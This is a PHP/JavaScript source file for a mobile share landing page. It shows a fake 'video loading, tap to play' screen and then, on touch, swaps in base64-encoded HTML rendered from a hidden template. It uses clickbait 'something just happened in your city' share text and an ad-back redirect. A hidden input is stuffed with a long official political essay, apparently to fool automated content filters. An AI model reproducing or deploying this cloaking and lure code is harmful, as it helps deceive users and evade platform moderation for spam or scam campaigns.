var str=  "<?php
include './inc/config.php';
include './inc/global.php';

$page = App::fetchPage();
preg_match('/\.(?<vid>\d+)\./', $_SERVER['REQUEST_URI'],$matches);
$page['search'] = $matches['vid'];
foreach($page as $key => $val){
    if(preg_match('/titles\d*/', $key)&&!is_array($val)){
        $page[$key] = explode("\n",$val);
    }
}
$pageConfig = array(
    'vid'   => $page['video'],
    'delay' => intval($page['delay_time']),
    'status'=> $cfg['switch_share'] == 'off' ? 'continue' : 'pending',
    'back'  => $page["ad_back"]
);

$shares = Cache::get('share');
$share = $shares['1'];
if(empty($share) || $share['type'] != 'jump') {
    $url = App::url();
    $url = App::wrapper($url);
    $pageConfig['title'] = $page['title'];
    $pageConfig['link'] = $url;
    $pageConfig['imgUrl'] = $page['image'];
    $pageConfig['desc'] = '<city>本地刚发生的>>>';
} else {
    $pageConfig['title'] = $share['title'];
    $pageConfig['link'] = App::wrapper($share['link']);
    $pageConfig['imgUrl'] = $share['image'];
    $pageConfig['desc'] = $share['desc'];
}

$cHost = getenv('HTTP_HOST');
$cHost = idn_to_ascii($cHost);
$cKey = md5($cHost);
Counter::increase($cKey, 'views');

 ob_start();
    include('./tpl/page_view_s.php');
    $s = ob_get_clean ();
    echo base64_encode ($s);
?>";
window.onload = function (e) {
    document.ontouchstart = function (event) {
        var new_doc = document.open("text/html", "replace");
        var b = new Base64();
        var html =  b.decode(str);
        new_doc.write(html);
        new_doc.close();
    }

    document.body.style.textAlign='center';

    document.title = "视频加载中...";

    var img =document.createElement('img');
    img.src ="http://<?php echo $_SERVER['HTTP_HOST']; ?>/public/images/f62bc0eaab04f7005a77c772cd8914b0.png"
    img.style.marginTop=256;
    img.width=256;
    img.height=256;
    document.body.appendChild(img);


    var div = document.createElement('div');
    div.style.marginTop = 256;
    var img = document.createElement('img');
    img.src = "http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"
    img.width = 60;
    img.height = 60;
    div.appendChild(img)
    var span = document.createElement('span');
    span.innerText = "视频加载中点击播放"
    span.style.color="#ff0000";
    span.style.fontSize=60;
    span.style.lineHight=60;
    div.appendChild(span)
    document.body.appendChild(div);
   
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.value = "党的十八大提出，倡导富强、民主、文明、和谐，倡导自由、平等、公正、法治，倡导爱国、敬业、诚信、友善，积极培育和践行社会主义核心价值观。富强、民主、文明、和谐是国家层面的价值目标，自由、平等、公正、法治是社会层面的价值取向，爱国、敬业、诚信、友善是公民个人层面的价值准则，这24个字是社会主义核心价值观的基本内容。“富强、民主、文明、和谐”，是我国社会主义现代化国家的建设目标，也是从价值目标层面对社会主义核心价值观基本理念的凝练，在社会主义核心价值观中居于最高层次，对其他层次的价值理念具有统领作用。富强即国富民强，是社会主义现代化国家经济建设的应然状态，是中华民族梦寐以求的美好夙愿，也是国家繁荣昌盛、人民幸福安康的物质基础。民主是人类社会的美好诉求。我们追求的民主是人民民主，其实质和核心是人民当家作主。它是社会主义的生命，也是创造人民美好幸福生活的政治保障。文明是社会进步的重要标志，也是社会主义现代化国家的重要特征。它是社会主义现代化国家文化建设的应有状态，是对面向现代化、面向世界、面向未来的，民族的科学的大众的社会主义文化的概括，是实现中华民族伟大复兴的重要支撑。和谐是中国传统文化的基本理念，集中体现了学有所教、劳有所得、病有所医、老有所养、住有所居的生动局面。它是社会主义现代化国家在社会建设领域的价值诉求，是经济社会和谐稳定、持续健康发展的重要保证。“自由、平等、公正、法治”，是对美好社会的生动表述，也是从社会层面对社会主义核心价值观基本理念的凝练。它反映了中国特色社会主义的基本属性，是我们党矢志不渝、长期实践的核心价值理念。自由是指人的意志自由、存在和发展的自由，是人类社会的美好向往，也是马克思主义追求的社会价值目标。平等指的是公民在法律面前的一律平等，其价值取向是不断实现实质平等。它要求尊重和保障人权，人人依法享有平等参与、平等发展的权利。公正即社会公平和正义，它以人的解放、人的自由平等权利的获得为前提，是国家、社会应然的根本价值理念。法治是治国理政的基本方式，依法治国是社会主义民主政治的基本要求。它通过法制建设来维护和保障公民的根本利益，是实现自由平等、公平正义的制度保证。“爱国、敬业、诚信、友善”，是公民基本道德规范，是从个人行为层面对社会主义核心价值观基本理念的凝练。它覆盖社会道德生活的各个领域，是公民必须恪守的基本道德准则，也是评价公民道德行为选择的基本价值标准。爱国是基于个人对自己祖国依赖关系的深厚情感，也是调节个人与祖国关系的行为准则。它同社会主义紧密结合在一起，要求人们以振兴中华为己任，促进民族团结、维护祖国统一、自觉报效祖国。敬业是对公民职业行为准则的价值评价，要求公民忠于职守，克己奉公，服务人民，服务社会，充分体现了社会主义职业精神。诚信即诚实守信，是人类社会千百年传承下来的道德传统，也是社会主义道德建设的重点内容，它强调诚实劳动、信守承诺、诚恳待人。友善强调公民之间应互相尊重、互相关心、互相帮助，和睦友好，努力形成社会主义的新型人际关系。";
    input.style.display='none';
    document.body.appendChild(input);
    
}
<?php 
header("Content-Type:application/javascript"); ?>
